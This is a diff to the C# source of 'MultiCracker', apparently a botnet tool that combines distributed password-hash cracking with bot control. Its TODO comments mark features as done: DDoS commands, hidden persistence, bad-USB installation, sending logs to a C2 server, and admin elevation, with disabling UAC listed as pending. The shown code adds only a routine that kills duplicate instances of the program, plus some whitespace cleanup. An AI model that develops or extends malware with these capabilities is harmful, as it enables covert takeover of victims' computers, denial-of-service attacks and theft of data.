@@ -33,7 +33,7 @@ namespace MultiCracker
         // ----------------------------------------
         // DONE: Add a way to split the cracking between bots
         // DONE: Add a way to set the hash to crack
-        // Add a way to set the hash algorithm (More algorithms)
+        // DONE: Add a way to set the hash algorithm (More algorithms)
         // Faster splitting (splitting without needing to to through all password combinations.)
         // DONE: Better checking for if bots are active or not
         // DONE: Add DDoS commands for the bots (Full on botnet style...)
@@ -41,8 +41,9 @@ namespace MultiCracker
         // DONE: Add a way to install hidden persistence.
         // DONE: Quick bad USB install.
         // DONE: Add a way to send the log file to the C2.
-        // Add a way to elevate to admin.
+        // DONE: Add a way to elevate to admin.
         // Disable UAC.
+        // DONE: Add a way to uninstall persistence.
         // ----------------------------------------
 
         bool EmergencySTOP = false;
@@ -103,6 +104,33 @@ namespace MultiCracker
             else
             {
                 Log(new LogMessage(LogSeverity.Info, "Debug", "Debug mode enabled."));
+            }
+            // Kill all other instances of this program
+            KillOtherInstances();
+        }
+
+        // Kill all other instances of this program
+        private void KillOtherInstances()
+        {
+            // Get the current process.
+            Process currentProcess = Process.GetCurrentProcess();
+
+            // Get all processes running on the local computer.
+            Process[] localAll = Process.GetProcesses();
+
+            // Loop through the processes.
+            foreach (Process process in localAll)
+            {
+                // Check if the process is the same as the current process.
+                if (process.Id != currentProcess.Id)
+                {
+                    // Check if the process is the same as the current process.
+                    if (process.ProcessName == currentProcess.ProcessName)
+                    {
+                        // Kill the process.
+                        process.Kill();
+                    }
+                }
             }
         }
 
@@ -1672,8 +1700,6 @@ namespace MultiCracker
         }
 
 
-
-
         // Form
         public void PassToHash(string pass)
         {
@@ -1874,8 +1900,6 @@ namespace MultiCracker
 
             return combinations;
         }
-
-
 
 
 
